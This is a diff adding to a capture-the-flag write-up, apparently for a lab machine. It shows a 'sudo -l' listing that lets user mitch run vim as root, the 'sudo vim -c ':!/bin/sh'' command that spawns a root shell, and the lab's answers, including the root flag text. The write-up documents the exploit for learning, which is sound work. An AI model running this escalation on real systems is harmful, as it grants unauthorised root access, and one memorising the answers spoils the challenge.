@@ -268,8 +268,20 @@ $
 
 ```
 
-Using privilege escalation, check sudo -l for possible 
+Using privilege escalation, check sudo -l for possible points to exploit:
 
+```
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+```
+
+Now that we can use vim for privilege escalation, we can check GTFObins page for exploit:
+
+![[Pasted image 20220818081530.png]]
+
+Then we can now execute and capture the rootflag.
 ```
 
 $ sudo vim -c ':!/bin/sh'
@@ -284,3 +296,11 @@ W3ll d0n3. You made it!
 # 
 
 ```
+
+What can you leverage to spawn a privileged shell?
+- vim
+
+What's the root flag?
+- W3ll d0n3. You made it!
+
+END
